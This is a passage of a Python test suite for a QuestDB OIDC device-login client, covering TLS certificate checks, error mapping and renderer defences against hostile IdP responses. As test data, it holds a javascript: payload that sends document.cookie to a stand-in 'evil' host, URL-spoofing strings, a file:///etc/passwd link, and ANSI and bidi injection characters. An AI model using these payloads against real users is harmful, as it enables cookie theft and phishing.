        server_thread.join(2.0)

        self.assertFalse(
            hung,
            'request() hung on a status-line dribble: the head-read watchdog '
            'never fired (M1 regression — the response head read is unbounded).')
        self.assertIsInstance(result.get('error'), OidcNetworkError)

    def test_bad_ca_bundle_raises_config_error(self):
        # A missing or invalid CA bundle path (explicit or via env) must surface
        # as OidcConfigError, not a raw FileNotFoundError / ssl.SSLError. See M1.
        import tempfile
        from questdb.auth._http import build_ssl_context
        with self.assertRaises(OidcConfigError):
            build_ssl_context('/no/such/path/ca.pem')
        with tempfile.NamedTemporaryFile('w', suffix='.pem', delete=False) as f:
            f.write('not a certificate')
            bad = f.name
        try:
            with self.assertRaises(OidcConfigError):
                build_ssl_context(bad)
        finally:
            os.unlink(bad)

    def test_default_context_verifies_certificates(self):
        # The single most load-bearing security default: every IdP credential
        # POST (device-code, each poll, refresh) rides build_ssl_context(). It
        # MUST verify the server certificate and check the hostname. A regression
        # swapping in ssl._create_unverified_context(), or setting
        # check_hostname=False / verify_mode=CERT_NONE, would silently expose
        # every device-code and long-lived refresh-token POST to a MITM while
        # breaking no other test. Assert the posture directly so such a
        # regression fails here.
        import ssl
        from questdb.auth._http import build_ssl_context
        ctx = build_ssl_context()  # no-arg: the production default path
        self.assertEqual(ctx.verify_mode, ssl.CERT_REQUIRED)
        self.assertTrue(ctx.check_hostname)

    def test_untrusted_server_certificate_is_rejected(self):
        # Behavioural companion to the unit assertion above: a real TLS handshake
        # against a server presenting a cert the default trust store does not
        # trust (a self-signed cert — what a MITM would present) MUST fail, and a
        # custom CA context built to trust that cert MUST still verify + connect.
        # Together these catch a verification regression that the configuration
        # assertion alone could miss (e.g. a verify that is silently bypassed on
        # the request path). The cert is generated fresh at runtime, so there is
        # no embedded-cert expiry to rot the test.
        try:
            from datetime import datetime, timedelta, timezone
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
        except ImportError:
            self.skipTest('cryptography not installed (handshake test skipped; '
                          'test_default_context_verifies_certificates still '
                          'guards the verification posture)')
        import http.server
        import ipaddress
        import ssl
        import threading
        from questdb.auth._http import build_ssl_context, get_json

        tmp = tempfile.mkdtemp()
        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        name = x509.Name(
            [x509.NameAttribute(NameOID.COMMON_NAME, 'localhost')])
        now = datetime.now(timezone.utc)
        cert = (x509.CertificateBuilder()
                .subject_name(name).issuer_name(name)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=3650))
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.DNSName('localhost'),
                        x509.IPAddress(ipaddress.ip_address('127.0.0.1'))]),
                    critical=False)
                .sign(key, hashes.SHA256()))
        certfile = os.path.join(tmp, 'cert.pem')
        with open(certfile, 'wb') as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        with open(os.path.join(tmp, 'key.pem'), 'wb') as f:
            f.write(key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption()))
        keyfile = os.path.join(tmp, 'key.pem')

        class _Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                body = b'{"ok": true}'
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Content-Length', str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):
                pass

        class _QuietTLSServer(http.server.HTTPServer):
            # A rejected handshake (the negative case below) is expected; don't
            # let its traceback spam the test output.
            def handle_error(self, request, client_address):
                pass

        sctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        sctx.load_cert_chain(certfile, keyfile)
        httpd = _QuietTLSServer(('127.0.0.1', 0), _Handler)
        httpd.socket = sctx.wrap_socket(httpd.socket, server_side=True)
        port = httpd.server_address[1]
        t = threading.Thread(target=httpd.serve_forever, daemon=True)
        t.start()
        try:
            url = f'https://localhost:{port}/'
            # Production default context trusts only system roots -> the
            # self-signed cert fails verification -> typed network error.
            with self.assertRaises(OidcNetworkError):
                get_json(url, timeout=5)
            # A context that DOES trust the cert must still verify + check
            # hostname (never relaxed by adding a CA), and connect cleanly.
            trusting = build_ssl_context(ca_bundle=certfile)
            self.assertEqual(trusting.verify_mode, ssl.CERT_REQUIRED)
            self.assertTrue(trusting.check_hostname)
            self.assertEqual(get_json(url, ctx=trusting, timeout=5), {'ok': True})
        finally:
            httpd.shutdown()
            t.join(10)
            self.assertFalse(t.is_alive(), 'TLS test server thread did not stop')
            httpd.server_close()

    def test_deeply_nested_json_raises_oidc_error(self):
        # A RecursionError from json.loads (a deeply-nested JSON body exhausts
        # the decoder's stack) must be mapped to OidcError, not escape the
        # typed-error contract. The depth at which json actually raises is a
        # Python-version detail — the C scanner ignores sys.setrecursionlimit,
        # and 3.14 parses far deeper than 3.13, so a fixed-depth body no longer
        # raises there — so inject the RecursionError directly to test the
        # mapping deterministically across versions. See M1.
        from questdb.auth import _http
        with _raw_response_server(
                    200, 'application/json', b'{"ok": true}') as base, \
                mock.patch.object(
                    _http.json, 'loads',
                    side_effect=RecursionError('nesting too deep')):
            with self.assertRaises(OidcError):
                _http.get_json(base + '/x', timeout=5)
            with self.assertRaises(OidcError):
                _http.post_form(base + '/x', {'a': 'b'}, timeout=5)

    def test_post_form_non_json_2xx_raises_oidc_error(self):
        # A 2xx body from the token/device endpoint that isn't JSON (e.g. an
        # HTML login page from a proxy in front of the IdP) must surface as
        # OidcError, not a raw decoder error. Only /exec had this before. M4.
        from questdb.auth import _http
        with _raw_response_server(200, 'text/html', b'<html>login</html>') as b:
            with self.assertRaises(OidcError):
                _http.post_form(b + '/token', {'a': 'b'}, timeout=5)

    def test_post_form_non_dict_json_raises_oidc_error(self):
        # A JSON array (valid JSON but not an object) from the token endpoint
        # must surface as OidcError WITH the HTTP status attached, so the poll
        # loop can tell a terminal 4xx from a transient/2xx instead of polling on
        # to a misleading "code expired". See M4 / review m1.
        from questdb.auth import _http
        with _raw_response_server(200, 'application/json', b'[1, 2, 3]') as b:
            with self.assertRaises(OidcError) as cm:
                _http.post_form(b + '/token', {'a': 'b'}, timeout=5)
            self.assertEqual(cm.exception.status, 200)
        with _raw_response_server(400, 'application/json', b'["nope"]') as b:
            with self.assertRaises(OidcError) as cm:
                _http.post_form(b + '/token', {'a': 'b'}, timeout=5)
            self.assertEqual(cm.exception.status, 400)

    def test_get_json_non_2xx_raises_oidc_error(self):
        # A non-2xx /settings or discovery response must surface as a typed
        # OidcError SUBCLASS matching the cause (mirroring how _refresh /
        # _poll_for_token classify post_form): a 5xx/429 is transient ->
        # OidcNetworkError, a 4xx/3xx is a config problem -> OidcConfigError. The
        # HTTP status is attached either way so a retry caller can classify
        # terminal-vs-transient the same way. See M4.
        from questdb.auth import _http
        with _raw_response_server(500, 'text/plain', b'boom') as b:
            with self.assertRaises(OidcNetworkError) as cm:
                _http.get_json(b + '/settings', timeout=5)
        self.assertEqual(cm.exception.status, 500)
        with _raw_response_server(429, 'text/plain', b'slow') as b:
            with self.assertRaises(OidcNetworkError) as cm:
                _http.get_json(b + '/settings', timeout=5)
        self.assertEqual(cm.exception.status, 429)
        with _raw_response_server(404, 'text/plain', b'nope') as b:
            with self.assertRaises(OidcConfigError) as cm:
                _http.get_json(b + '/settings', timeout=5)
        self.assertEqual(cm.exception.status, 404)

    def test_get_json_non_json_2xx_raises_oidc_error(self):
        # A 2xx /settings or discovery body that isn't JSON (an HTML login/error
        # page, the wrong URL) is a configuration problem -> OidcConfigError, not
        # a raw JSONDecodeError. See M4.
        from questdb.auth import _http
        with _raw_response_server(200, 'text/html', b'<html>x</html>') as b:
            with self.assertRaises(OidcConfigError) as cm:
                _http.get_json(
                    b + '/.well-known/openid-configuration', timeout=5)
        self.assertEqual(cm.exception.status, 200)  # status attached

    def test_invalid_utf8_json_body_raises_oidc_error(self):
        # m8: HttpResponse.json() decodes the body as utf-8 with NO
        # errors='replace' (unlike text()), so an invalid-UTF-8 2xx body raises
        # UnicodeDecodeError. Both call sites (post_form, get_json) must catch it
        # and surface a typed error rather than let a raw UnicodeDecodeError
        # escape the contract. (The existing 0x80..0x82 test targets the JWT
        # base64 payload, not the HTTP body decode.)
        from questdb.auth import _http
        with _raw_response_server(200, 'application/json', b'\xff\xfe') as b:
            with self.assertRaises(OidcError):
                _http.post_form(b + '/token', {'a': 'b'}, timeout=5)
        with _raw_response_server(200, 'application/json', b'\xff\xfe') as b:
            with self.assertRaises(OidcConfigError):
                _http.get_json(b + '/settings', timeout=5)


class TestRendererSecurity(unittest.TestCase):
    """The Jupyter prompt must never turn an IdP-supplied URL into a
    clickable/executable link unless it uses an http(s) scheme."""

    def test_safe_link_url_allowlist(self):
        from questdb.auth._render import _safe_link_url
        self.assertEqual(_safe_link_url('https://idp/x'), 'https://idp/x')
        self.assertEqual(_safe_link_url('http://idp/x'), 'http://idp/x')
        self.assertEqual(_safe_link_url('HTTPS://idp/x'), 'HTTPS://idp/x')
        for bad in ('javascript:alert(1)', 'data:text/html,x',
                    'vbscript:x', 'file:///etc/passwd', '', None):
            self.assertIsNone(_safe_link_url(bad))
        # Surrounding whitespace is trimmed: urlparse ignores it when parsing the
        # scheme, so the value we return (and hand to the href / browser) must be
        # the trimmed one, not the untrimmed original.
        self.assertEqual(
            _safe_link_url('  https://idp.example.com/x  '),
            'https://idp.example.com/x')

    def test_safe_link_url_rejects_userinfo_and_confusable_host(self):
        # M2: an http(s) URL that could MISREPRESENT its destination host must
        # not be made clickable / auto-opened — embedded userinfo (reads as the
        # trusted host, connects past the '@'), or a non-ASCII confusable /
        # control char in the authority. Such a URL is shown as inert text
        # instead. Defeating a host-spoof the scheme allowlist alone misses.
        from questdb.auth._render import _safe_link_url
        spoofs = [
            'https://login.questdb.io@evil.example/device',     # userinfo
            'https://idp.example.com@evil/device?user_code=X',  # userinfo
            'https://evil.example／login.questdb.io/auth',  # fullwidth solidus
            'https://qоestdb.io/device',                   # Cyrillic homograph
            'https://idp.example.com\x00/device',               # NUL in authority
        ]
        for url in spoofs:
            self.assertIsNone(_safe_link_url(url), f'should reject {url!r}')
        # Legitimate targets (DNS, explicit port, loopback, IPv6, punycode IDN)
        # still pass — the host gate must not over-block the happy path.
        for url in (
                'https://idp.example.com/device',
                'https://idp.example.com:8443/device?user_code=WDJB-MJHT',
                'http://127.0.0.1:9000/device',
                'https://[::1]:8080/device',
                'https://xn--nxasmm1c.example/device',
                'https://accounts.google.com/o/oauth2/device/code'):
            self.assertEqual(_safe_link_url(url), url, f'should accept {url!r}')

    def test_safe_link_url_rejects_interior_tab_newline_cr(self):
        # m1: urlparse() silently REMOVES tab/newline/CR from the URL before
        # parsing, so _safe_link_url would otherwise VET the stripped form yet
        # RETURN the original (→ href / browser / QR) with the bytes intact — the
        # value vetted would not equal the value returned/clicked. It must return
        # None so that invariant holds when called directly.
        from questdb.auth._render import _safe_link_url, _safe_target
        for url in ('https://idp.example\t.com/device',   # tab splits host label
                    'https://idp.example.com/de\tvice',    # tab in path
                    'https://idp.example.com\n/device',    # newline
                    'https://idp.example.com\r/device'):   # CR
            self.assertIsNone(_safe_link_url(url), f'should reject {url!r}')
        # The production entry point (_safe_target) strips control chars first, so
        # a raw response value carrying them is sanitized to a single vetted target
        # rather than rejected — display, browser and QR all see the same clean URL.
        self.assertEqual(
            _safe_target('https://idp.example.com\n/device'),
            'https://idp.example.com/device')

    def test_safe_link_url_rejects_malformed_port_no_display_divergence(self):
        # A non-integer / out-of-range port must make the URL non-clickable, so
        # the displayed link cannot diverge from the href / webbrowser.open() /
        # QR target. _display_url DROPS a junk port from the shown text (it can't
        # render one), so if _safe_link_url returned the URL verbatim with the
        # port intact, the user would read "https://idp.example.com/device" while
        # the click / browser / QR went to a different port on that host — the
        # exact shown-vs-opened spoof _safe_target exists to prevent.
        from questdb.auth._render import (
            _safe_link_url, _safe_target, _display_url, _render_link)
        for url in ('https://idp.example.com:70000/device',   # out of range
                    'https://idp.example.com:99999/device',   # out of range
                    'https://idp.example.com:0x50/device',    # non-integer
                    'https://idp.example.com:8080abc/device'):  # non-integer
            self.assertIsNone(_safe_link_url(url), f'should reject {url!r}')
            self.assertIsNone(_safe_target(url), f'should reject {url!r}')
            # Shown as inert text (no clickable <a>), so nothing can diverge.
            self.assertNotIn('<a ', _render_link(url), f'clickable: {url!r}')
        # A valid explicit port is unaffected: still clickable AND the shown text
        # keeps the port, so display and target agree.
        ok = 'https://idp.example.com:8443/device'
        self.assertEqual(_safe_link_url(ok), ok)
        self.assertIn(':8443', _display_url(ok))

    def test_render_link_inert_for_dangerous_scheme(self):
        from questdb.auth._render import _render_link
        safe = _render_link('https://idp/x')
        self.assertIn('<a href="https://idp/x"', safe)
        evil = _render_link('javascript:alert(document.cookie)')
        self.assertNotIn('<a ', evil)
        self.assertNotIn('href', evil)

    def test_jupyter_prompt_never_emits_dangerous_href(self):
        from questdb.auth._render import JupyterRenderer

        captured = {}

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):  # avoid importing IPython
                captured['html'] = html_str

        # A hostile/MITM'd device response.
        _Capturing().on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'javascript:fetch("//evil/?c="+document.cookie)',
            'verification_uri_complete': 'data:text/html,<script>x</script>',
            'expires_in': 600, 'interval': 5,
        })
        html_out = captured['html'].lower()
        self.assertNotIn('<a ', html_out)            # no clickable link at all
        self.assertNotIn('href="javascript', html_out)
        self.assertNotIn('href="data:', html_out)

        # A legitimate https URL still renders as a clickable link.
        captured.clear()
        _Capturing().on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'https://idp.example.com/device',
            'expires_in': 600, 'interval': 5,
        })
        self.assertIn('<a href="https://idp.example.com/device"',
                      captured['html'])

    def test_jupyter_qr_suppressed_for_dangerous_url(self):
        # With qr=True, a dangerous (javascript:/data:) verification URL must NOT
        # produce a QR <img>: the data-URI is gated on _safe_link_url before
        # qrcode is ever called. Holds whether or not the optional qrcode dep is
        # installed (a dangerous URL never reaches the encoder).
        from questdb.auth._render import JupyterRenderer
        captured = {}

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):
                captured['html'] = html_str

        _Capturing(qr=True).on_prompt({
            'user_code': 'X', 'verification_uri': 'javascript:alert(1)',
            'expires_in': 600, 'interval': 5})
        self.assertNotIn('<img', captured['html'].lower())

    def test_jupyter_qr_persists_across_rerenders(self):
        # M2: the QR <img> is built in the shared _prompt_head, so it survives
        # EVERY re-render. on_waiting fires on the first poll tick and used to
        # wipe it (the countdown re-render dropped the QR), leaving qr=True
        # effectively dead in Jupyter. Stub qrcode so this is deterministic
        # whether or not the optional dep is installed.
        import re
        from questdb.auth._render import JupyterRenderer
        renders = []

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):
                renders.append(html_str)

        fake_qrcode = types.ModuleType('qrcode')

        def _make(data):
            class _Img:
                def save(self, buf, format=None):
                    buf.write(b'\x89PNG' + data.encode())
            return _Img()
        fake_qrcode.make = _make

        with mock.patch.dict(sys.modules, {'qrcode': fake_qrcode}):
            r = _Capturing(qr=True)
            r.on_prompt({
                'user_code': 'WDJB-MJHT',
                'verification_uri': 'https://idp.example.com/device',
                'verification_uri_complete':
                    'https://idp.example.com/device?user_code=WDJB-MJHT',
                'expires_in': 600, 'interval': 5})
            r.on_waiting(120.0)   # the first countdown tick — used to drop the QR
            r.on_success('alice@example.com', 3600)

        self.assertEqual(len(renders), 3)
        self.assertTrue(
            all('<img alt="QR code"' in h for h in renders),
            'QR <img> must persist across on_prompt / on_waiting / on_success')
        # The PNG is generated once and reused (same data-URI on every render).
        uris = [re.search(r'src="(data:[^"]+)"', h).group(1) for h in renders]
        self.assertEqual(len(set(uris)), 1)

    def test_fmt_mmss(self):
        from questdb.auth._render import _fmt_mmss
        self.assertEqual(_fmt_mmss(0), '0:00')
        self.assertEqual(_fmt_mmss(5), '0:05')
        self.assertEqual(_fmt_mmss(65), '1:05')
        self.assertEqual(_fmt_mmss(600), '10:00')
        self.assertEqual(_fmt_mmss(-5), '0:00')      # clamped, never negative
        self.assertEqual(_fmt_mmss(125.9), '2:05')   # truncates seconds

    def test_fmt_mmss_handles_non_finite(self):
        # A non-finite remaining time (inf/nan) must not crash _fmt_mmss with an
        # OverflowError/ValueError from int(); it degrades to 0:00. Unreachable in
        # practice (callers clamp to a finite value) — defense-in-depth. M5.
        from questdb.auth._render import _fmt_mmss
        self.assertEqual(_fmt_mmss(float('inf')), '0:00')
        self.assertEqual(_fmt_mmss(float('nan')), '0:00')
        self.assertEqual(_fmt_mmss(float('-inf')), '0:00')

    def test_jupyter_second_signin_creates_new_display(self):
        # A second sign-in on the SAME renderer (e.g. after clear() then token())
        # must create a FRESH display in the current cell, not .update() the
        # previous sign-in's output area: on_prompt resets the display handle. M3.
        from questdb.auth._render import JupyterRenderer
        events = []

        class _Cap(JupyterRenderer):
            def _display(self, html_str):
                # Mimic IPython: create when handle is None, else update in place.
                if self._handle is None:
                    self._handle = object()
                    events.append('create')
                else:
                    events.append('update')

        r = _Cap()
        resp = {'user_code': 'A', 'verification_uri': 'https://idp/d',
                'expires_in': 600, 'interval': 5}
        r.on_prompt(resp)            # first sign-in -> create
        r.on_waiting(120.0)          # same sign-in -> update in place
        r.on_success('alice', 3600)  # same sign-in -> update in place
        r.on_prompt(resp)            # SECOND sign-in -> must create afresh
        self.assertEqual(events, ['create', 'update', 'update', 'create'])

    def test_terminal_qr_suppressed_for_dangerous_url(self):
        # With qr=True, a dangerous (javascript:/data:) verification URL must NOT
        # be encoded into a terminal QR: the target is scheme-vetted via
        # _safe_link_url before qrcode is ever called, mirroring the Jupyter QR.
        # Holds whether or not the optional qrcode dep is installed. M4.
        import io
        from questdb.auth._render import TerminalRenderer
        invoked = {'n': 0}
        fake_qrcode = types.ModuleType('qrcode')

        class _QR:
            def __init__(self, *a, **k):
                invoked['n'] += 1

            def add_data(self, *a):
                pass

            def make(self, *a, **k):
                pass

            def print_ascii(self, *a, **k):
                pass

        fake_qrcode.QRCode = _QR
        with mock.patch.dict(sys.modules, {'qrcode': fake_qrcode}):
            TerminalRenderer(stream=io.StringIO(), qr=True).on_prompt({
                'user_code': 'X', 'verification_uri': 'javascript:alert(1)',
                'expires_in': 600, 'interval': 5})
        self.assertEqual(invoked['n'], 0)  # qrcode never reached for a bad URL

    def test_terminal_qr_rendered_for_safe_url(self):
        # The flip side: a legitimate https verification URL with qr=True IS
        # encoded and written to the terminal — the scheme gate must not
        # over-block the happy path. Stub qrcode so this is deterministic. M4.
        import io
        from questdb.auth._render import TerminalRenderer
        fake_qrcode = types.ModuleType('qrcode')

        class _QR:
            def __init__(self, *a, **k):
                pass

            def add_data(self, *a):
                pass

            def make(self, *a, **k):
                pass

            def print_ascii(self, *a, out=None, **k):
                out.write('QR-ART')

        fake_qrcode.QRCode = _QR
        buf = io.StringIO()
        with mock.patch.dict(sys.modules, {'qrcode': fake_qrcode}):
            TerminalRenderer(stream=buf, qr=True).on_prompt({
                'user_code': 'X',
                'verification_uri': 'https://idp.example.com/device',
                'expires_in': 600, 'interval': 5})
        self.assertIn('QR-ART', buf.getvalue())

    def test_detect_interactive_requires_tty(self):
        # Outside a notebook kernel, interactivity requires both stdin AND stdout
        # to be a TTY (guards against hanging in papermill / cron / CI).
        from questdb.auth import _render
        with mock.patch.object(_render, 'in_ipython_kernel', return_value=False):
            with mock.patch.object(sys, 'stdin') as si, \
                    mock.patch.object(sys, 'stdout') as so:
                si.isatty.return_value = True
                so.isatty.return_value = True
                self.assertTrue(_render.detect_interactive())
                so.isatty.return_value = False  # stdout not a tty
                self.assertFalse(_render.detect_interactive())

    def test_kernel_without_stdin_is_noninteractive(self):
        # papermill / nbclient / nbconvert --execute run a real kernel
        # (in_ipython_kernel True) but execute with allow_stdin=False — there is
        # no human to authorize. detect_interactive must report non-interactive
        # so the device flow fails fast instead of polling to the device-code
        # deadline; a real Jupyter frontend sends allow_stdin=True (interactive).
        # papermill sets no env var, so the kernel stdin flag is the signal.
        from questdb.auth import _render

        def fake_ipython(kernel):
            mod = types.ModuleType('IPython')
            mod.get_ipython = lambda: types.SimpleNamespace(kernel=kernel)
            return mod

        with mock.patch.object(_render, 'in_ipython_kernel', return_value=True):
            # papermill / nbclient / nbconvert: allow_stdin False -> fail fast.
            with mock.patch.dict(sys.modules, {'IPython': fake_ipython(
                    types.SimpleNamespace(_allow_stdin=False))}):
                self.assertFalse(_render._kernel_allows_stdin())
                self.assertFalse(_render.detect_interactive())
            # Real Jupyter frontend: allow_stdin True -> interactive.
            with mock.patch.dict(sys.modules, {'IPython': fake_ipython(
                    types.SimpleNamespace(_allow_stdin=True))}):
                self.assertTrue(_render._kernel_allows_stdin())
                self.assertTrue(_render.detect_interactive())
            # Signal unreadable -> assume a human is present (never wrongly refuse
            # one): terminal IPython has no .kernel; a kernel may lack the attr;
            # and IPython may fail to import entirely.
            with mock.patch.dict(sys.modules, {'IPython': fake_ipython(None)}):
                self.assertTrue(_render._kernel_allows_stdin())
            with mock.patch.dict(sys.modules, {'IPython': fake_ipython(
                    types.SimpleNamespace())}):
                self.assertTrue(_render._kernel_allows_stdin())
            with mock.patch.dict(sys.modules, {'IPython': None}):
                self.assertTrue(_render._kernel_allows_stdin())

    def test_in_ipython_kernel_false_without_ipython(self):
        # When IPython can't be imported (plain CPython), it's not a kernel.
        from questdb.auth import _render
        with mock.patch.dict(sys.modules, {'IPython': None}):
            self.assertFalse(_render.in_ipython_kernel())

    def test_jupyter_prompt_strips_control_and_bidi_chars(self):
        # M3: the Jupyter path must ALSO strip control / bidi / zero-width chars
        # from untrusted device-response fields — html.escape neutralizes markup
        # but NOT a U+202E bidi override or zero-width chars, which can visually
        # spoof the sign-in prompt in the notebook DOM. chr(cp) keeps the
        # invisible characters out of the test source.
        from questdb.auth._render import JupyterRenderer

        captured = {}

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):  # avoid importing IPython
                captured['html'] = html_str

        r = _Capturing()
        r.on_prompt({
            'user_code': 'WD' + chr(0x202e) + 'JB' + chr(0x200b),
            'verification_uri': 'https://idp.example.com/' + chr(0x202e),
            'verification_uri_complete':
                'https://idp.example.com/c' + chr(0x200b) + 'omplete',
            'expires_in': 600, 'interval': 5,
        })
        for cp in (0x202e, 0x200b):
            self.assertNotIn(chr(cp), captured['html'],
                             f'U+{cp:04X} reached the notebook DOM')
        self.assertIn('idp.example.com', captured['html'])

        # identity (untrusted JWT claim) on success and error_description on
        # failure are sanitized too — both re-render the prompt head.
        r.on_success('alice' + chr(0x202e) + '@evil', 3600)
        self.assertNotIn(chr(0x202e), captured['html'])
        r.on_failure('access denied ' + chr(0x202e) + 'spoof')
        self.assertNotIn(chr(0x202e), captured['html'])

    def test_terminal_prompt_strips_control_chars(self):
        # A hostile/MITM'd device response must not inject ANSI escape sequences
        # into the plain-text terminal prompt (cursor moves / screen clears that
        # could spoof the sign-in URL). The Jupyter path html-escapes; the
        # terminal path strips control characters. See M5.
        import io
        from questdb.auth._render import format_prompt, TerminalRenderer
        resp = {
            'user_code': 'WDJB\x1bMJHT',
            'verification_uri': 'https://idp.example.com/\x1b[31mdevice',
            'verification_uri_complete': 'https://idp.example.com/d\x07ev',
        }
        text = format_prompt(resp)
        self.assertNotIn('\x1b', text)            # ESC stripped
        self.assertNotIn('\x07', text)            # BEL stripped
        self.assertIn('WDJBMJHT', text)           # printable user_code survives
        self.assertIn('idp.example.com', text)

        # The full terminal path (on_prompt + on_failure) is clean too.
        buf = io.StringIO()
        r = TerminalRenderer(stream=buf)
        r.on_prompt(resp)
        r.on_failure('denied \x1b[2K by idp')     # IdP error_description path
        out = buf.getvalue()
        self.assertNotIn('\x1b', out)
        self.assertNotIn('\x07', out)

    def test_terminal_prompt_survives_unencodable_stream(self):
        # On a stream whose encoding can't represent the prompt's emoji (a
        # legacy code-page Windows console, an `ascii` PYTHONIOENCODING, or a
        # redirected stderr), the decorative glyphs must degrade but the
        # verification URL and user code must STILL reach the user — not vanish
        # into a silent hang. M3.
        from questdb.auth._render import TerminalRenderer

        class _AsciiStream:
            encoding = 'ascii'

            def __init__(self):
                self.parts = []

            def write(self, s):
                s.encode(self.encoding)  # raises UnicodeEncodeError, like a TTY
                self.parts.append(s)

            def flush(self):
                pass

        stream = _AsciiStream()
        r = TerminalRenderer(stream=stream)
        r.on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'https://idp.example.com/device',
        })
        r.on_success('alice@example.com', 3600)
        r.on_failure('access denied')
        out = ''.join(stream.parts)
        # The essential content survived (only the un-encodable glyphs were
        # replaced); nothing was blackholed and no exception escaped.
        self.assertIn('https://idp.example.com/device', out)
        self.assertIn('WDJB-MJHT', out)
        self.assertIn('alice@example.com', out)
        self.assertIn('access denied', out)
        out.encode('ascii')  # the whole transcript is ascii-encodable

    def test_strip_control_removes_bidi_and_zero_width(self):
        # Beyond C0/C1, untrusted device-response fields must have Unicode
        # bidi-override / zero-width / line-separator characters stripped before
        # they reach a TTY: U+202E (RIGHT-TO-LEFT OVERRIDE) can visually reverse
        # a URL to spoof the sign-in host. chr(cp) avoids embedding the
        # (invisible) characters in the test source. See M2.
        from questdb.auth._render import _strip_control, format_prompt
        for cp in (0x202e, 0x202d, 0x2066, 0x2069, 0x200b, 0x200f,
                   0x2028, 0x2029, 0xfeff,
                   # also the format/bidi code points added for M3:
                   0x00ad, 0x061c, 0x115f, 0x180e, 0x2060, 0x2064, 0xfff9,
                   # the category-based strip also covers the deprecated U+206x
                   # format chars, the Tags block, unassigned code points,
                   # Arabic format marks and the other invisible Hangul fillers:
                   0x206a, 0x206f, 0x2065, 0xe0001, 0xe007f, 0x0600,
                   0x1160, 0x3164, 0xffa0,
                   # variation selectors (category Mn, invisible) and enclosing
                   # combining marks (category Me, which overlay the preceding
                   # glyph) — neither belongs in an identity / URL / user_code:
                   0xfe0e, 0xfe0f, 0xe0100, 0x20e0, 0x0489):
            self.assertEqual(_strip_control('a' + chr(cp) + 'b'), 'ab',
                             f'U+{cp:04X} not stripped')
        # Legitimate text (incl. accents / CJK / printable ASCII) is preserved.
        self.assertEqual(_strip_control('café 北京 user-1'), 'café 北京 user-1')
        text = format_prompt({
            'user_code': 'WD' + chr(0x202e) + 'JB',
            'verification_uri': 'https://idp.example.com/' + chr(0x202e)})
        self.assertNotIn(chr(0x202e), text)
        self.assertIn('idp.example.com', text)

    def test_strip_control_caps_combining_run(self):
        # A "Zalgo" stack — many non-spacing marks (Mn) on one base — smears over
        # adjacent prompt lines and can obscure the sign-in URL/code. _strip_control
        # keeps a short legitimate run and drops the overflow, while a normally
        # accented identity (a mark or two) is preserved untouched.
        from questdb.auth._render import _strip_control, _MAX_COMBINING_RUN
        acute = chr(0x0301)  # COMBINING ACUTE ACCENT (category Mn)
        self.assertEqual(
            _strip_control('a' + acute * 50 + 'b'),
            'a' + acute * _MAX_COMBINING_RUN + 'b')
        # Interleaving zero-width chars must NOT reset the cap (a stripped char is
        # transparent to the run), so the overflow is still dropped.
        out = _strip_control('a' + (acute + chr(0x200b)) * 50 + 'b')
        self.assertEqual(out.count(acute), _MAX_COMBINING_RUN)
        # A legitimately accented identity is untouched.
        self.assertEqual(_strip_control('e' + acute), 'e' + acute)
        self.assertEqual(_strip_control('café 北京'), 'café 北京')

    def test_strip_control_removes_invisible_default_ignorable_marks(self):
        # m3: invisible Default_Ignorable non-spacing marks (category Mn) that the
        # "keep accents" rule would otherwise keep — the combining grapheme joiner
        # (U+034F), the Mongolian free variation selectors (U+180B-U+180D, U+180F)
        # and the Khmer inherent vowels (U+17B4, U+17B5) — can hide payload in a
        # user_code / identity / URL exactly like the FE00-FE0F variation
        # selectors. They must be stripped; a legitimate accent is still kept.
        from questdb.auth._render import _strip_control
        for cp in (0x034F, 0x180B, 0x180C, 0x180D, 0x180F, 0x17B4, 0x17B5):
            self.assertEqual(_strip_control('A' + chr(cp) + 'B'), 'AB',
                             f'U+{cp:04X} not stripped')
        # A run of them can't smuggle a hidden gap into a user_code.
        self.assertEqual(
            _strip_control('WDJB' + chr(0x034f) + chr(0x180b) + 'MJHT'),
            'WDJBMJHT')
        # A legitimate accent (also category Mn) is still preserved.
        self.assertEqual(_strip_control('e' + chr(0x0301)), 'e' + chr(0x0301))

    def test_strip_control_folds_exotic_whitespace_to_ascii_space(self):
        # An invisible-as-space separator (NBSP, ideographic space, ...) is a
        # phishing primitive: it can pad a user_code / identity / error to hide
        # trailing text that looks like a normal gap. _strip_control folds every
        # non-ASCII Zs to a plain U+0020, while the ordinary ASCII space of a
        # legitimate identity survives untouched.
        from questdb.auth._render import _strip_control
        for cp in (0x00a0, 0x2000, 0x2007, 0x202f, 0x205f, 0x3000):
            self.assertEqual(_strip_control('A' + chr(cp) + 'B'), 'A B',
                             f'U+{cp:04X} not folded to a plain space')
        # A hidden-text payload no longer reads as a clean four-char code.
        self.assertEqual(
            _strip_control('WXYZ' + chr(0x3000) * 4 + 'DELETE-ME'),
            'WXYZ    DELETE-ME')
        # Ordinary ASCII spaces (and accented names) are preserved.
        self.assertEqual(_strip_control('Alice Smith'), 'Alice Smith')
        self.assertEqual(_strip_control('café'), 'café')

    def test_format_prompt_renders_complete_uri_line(self):
        # The plain-text prompt shows verification_uri_complete on its own
        # "(or open directly: ...)" line when present, and omits the line when
        # absent. The complete URL is IDNA-normalized like the main link.
        from questdb.auth._render import format_prompt
        with_complete = format_prompt({
            'user_code': 'WXYZ',
            'verification_uri': 'https://idp.example.com/device',
            'verification_uri_complete':
                'https://idp.example.com/device?user_code=WXYZ'})
        self.assertIn('or open directly', with_complete)
